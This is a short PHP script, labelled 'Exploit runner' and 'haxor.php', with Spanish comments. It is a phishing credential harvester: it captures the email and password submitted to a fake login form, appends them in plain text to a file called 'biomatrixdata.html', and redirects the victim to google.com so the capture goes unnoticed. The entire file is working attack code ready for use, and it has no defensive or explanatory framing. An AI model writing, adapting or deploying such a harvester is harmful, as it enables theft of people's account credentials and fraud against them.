<?
/*
Exploit runner
*/

#haxor.php
// US PW var
$usuario = $_POST['email'];
$contraseña = $_POST['password'];
//SavedataUSPW
$guardame = fopen('biomatrixdata.html','a+');
fwrite($guardame,
"<br/><b>Usuario:</b>".$usuario.
"<br/><b>Contrasena:</b>".$contraseña." ");

fclose($guardame);
//Redirecciona a la web original

echo "<meta http-equiv='refresh' content='1;url=http://www.google.com'>"
?> 